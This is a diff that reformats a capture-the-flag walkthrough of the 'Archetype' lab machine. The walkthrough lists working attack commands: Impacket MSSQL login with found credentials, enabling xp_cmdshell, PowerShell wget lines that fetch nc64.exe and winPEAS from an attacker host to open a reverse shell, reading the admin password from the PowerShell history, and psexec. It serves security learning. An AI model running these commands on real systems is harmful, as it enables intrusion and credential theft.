@@ -1,35 +1,127 @@
-Archtype 
+# Archetype
 
+## Initial Enumeration
 
-Did nmap as usual to get the open ports - could see so many open ports like ms rpc, mssql and smb client etc  
-now will try accessing the smbclient by using : smbclient -N -L {ip address}  -N means no password and -L to list the share 
+Did `nmap` as usual to get the open ports — could see so many open ports like MS RPC, MSSQL, and SMB client, etc.
 
-I can see that only backup and IPC$ shares seems to be allowed public assess, and we get a dtsconfig file while opening “backup” share   it seems  .dtsconfig files is used to hardcode connection strings and passwords for the  sql server so a SSIS package ( Sql Server integration service ) will use it  to run ETLs 
-Since this was stored securely we can use the password and username given in the .dtsconfig and use it through impacket to connect to the sql server  
-password=[REDACTED];User ID=ARCHETYPE\sql_svc  we can connect using python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth,  mssqlclient.py is a python file inside the impacket repo and we add a flag -windows-auth to specify to use windows authentication   now a sql command line will show up and we use SELECT is_srvrolemember('sysadmin'); to check if our role is “sysadmin”  and it returned 1 so that means we are and we have the most high level access so we can use something called xp_cmdshell to run commands on the os   from a cheatsheet we get that this is how we enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; — priv
-RECONFIGURE; — priv
-EXEC sp_configure 'xp_cmdshell', 1; — priv
-RECONFIGURE; — priv  then EXEC xp_cmdshell 'net user'; to check if its activated
+```bash
+nmap -sC -sV -p- -Pn {target_ip}
+```
 
-now using this we will download the nc64.exe file we have hosted in a python server so we can run the nc64.exe to open the victims port 
+## SMB Enumeration
 
-to download we can do : xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
-http://10.10.14.9/nc64.exe -outfile nc64.exe”   wget we request to our python server where we have hosted the nc64.exe file and download it to the path specified which is download   now will connect to our port which we exposed using nc  -lvp {port} 
+Now will try accessing the `smbclient`:
 
-now we need to elevate our access using winpeas which we add to our python server and download it in victim’s device then run it in powershell - wget http://10.10.14.190/winPEASx64.exe -outfile winPEASx64.exe
+```bash
+smbclient -N -L {target_ip}
+```
 
-when you run the winPeas exe it returns a long output with too much info including vulnerabilities it seems its a enumeration tool   As per walkthrough “As this is a normal user account as well as a service account, it is worth checking for frequently access files
-or executed commands. To do that, we will read the PowerShell history file, which is the equivalent of
-.bash_history for Linux systems. The file ConsoleHost_history.txt can be located in the directory
-C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\” 
+- `-N` means no password  
+- `-L` to list the shares
 
-There we get the admin password and using :  python3 psexec.py administrator@10.129.95.187  then we get the root flag 
- dont forget : 
+We can see that only `backup` and `IPC$` shares seem to be allowed public access, and we get a `.dtsconfig` file while opening the `backup` share.
 
-winPEAS - for  local enumeration for privilege escalation.
+## Understanding the `.dtsconfig` File
 
-psexec.py - lets you authenticate with high privileges and get shell access (SMB-based).
+It seems `.dtsconfig` files are used to hardcode connection strings and passwords for the SQL Server so a **SSIS package** (SQL Server Integration Services) will use it to run ETLs.
 
+Since this was stored insecurely, we can use the password and username given in the `.dtsconfig` and connect through Impacket to the SQL server.
 
+```
+password=[REDACTED];User ID=ARCHETYPE\sql_svc
+```
 
- 
+## SQL Server Exploitation
+
+We can connect using:
+
+```bash
+python3 mssqlclient.py ARCHETYPE/sql_svc@{target_ip} -windows-auth
+```
+
+- `mssqlclient.py` is from the Impacket repo
+- `-windows-auth` specifies to use Windows authentication
+
+Now a SQL command line will show up. Use the following to check if our role is "sysadmin":
+
+```sql
+SELECT is_srvrolemember('sysadmin');
+```
+
+It returned `1` — so we have sysadmin access 🙌
+
+Now we can use something called `xp_cmdshell` to run commands on the OS.
+
+### Enable `xp_cmdshell`
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+To verify:
+
+```sql
+EXEC xp_cmdshell 'net user';
+```
+
+## Reverse Shell
+
+We’ll use this to download `nc64.exe` from our local machine:
+
+```sql
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"
+```
+
+Host `nc64.exe` on a Python HTTP server on attacker machine:
+
+```bash
+python3 -m http.server
+```
+
+Now connect to our listener:
+
+```bash
+nc -lvp {port}
+```
+
+## Privilege Escalation
+
+To escalate, we’ll use **winPEAS**, download and execute it on the victim:
+
+```sql
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.190/winPEASx64.exe -outfile winPEASx64.exe"
+```
+
+Run it in PowerShell. It gives a massive output — looks like it's an enumeration tool to identify privilege escalation paths.
+
+### Check PowerShell History
+
+As per walkthrough, since this is both a normal user account and a service account, check for frequently accessed files or executed commands.
+
+We read the PowerShell history:
+
+```
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+There we get the **admin password** 👀
+
+## Getting Root
+
+Now use:
+
+```bash
+python3 psexec.py administrator@10.129.95.187
+```
+
+We get the root flag 🎉
+
+---
+
+## Tools Used
+
+- `winPEAS` — for local enumeration for privilege escalation.
+- `psexec.py` — lets you authenticate with high privileges and get shell access (SMB-based).
